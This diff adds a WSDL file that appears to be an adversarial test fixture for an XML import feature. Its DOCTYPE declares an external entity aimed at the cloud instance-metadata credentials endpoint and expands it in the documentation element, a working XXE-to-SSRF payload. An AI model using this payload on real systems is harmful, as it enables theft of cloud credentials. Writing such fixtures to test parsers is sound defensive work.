@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Adversarial: XXE pointed at the cloud instance-metadata endpoint. A parser
+     that resolves external entities performs an SSRF fetch during import and can
+     leak instance credentials into the stored document. -->
+<!DOCTYPE wsdl:definitions [
+  <!ENTITY imds SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
+                  xmlns:xs="http://www.w3.org/2001/XMLSchema"
+                  targetNamespace="https://example.com/ssrf"
+                  name="SsrfService">
+  <wsdl:documentation>&imds;</wsdl:documentation>
+  <wsdl:types>
+    <xs:schema targetNamespace="https://example.com/ssrf">
+      <xs:element name="Ping" type="xs:string"/>
+    </xs:schema>
+  </wsdl:types>
+  <wsdl:portType name="PingPort">
+    <wsdl:operation name="Ping"/>
+  </wsdl:portType>
+</wsdl:definitions>
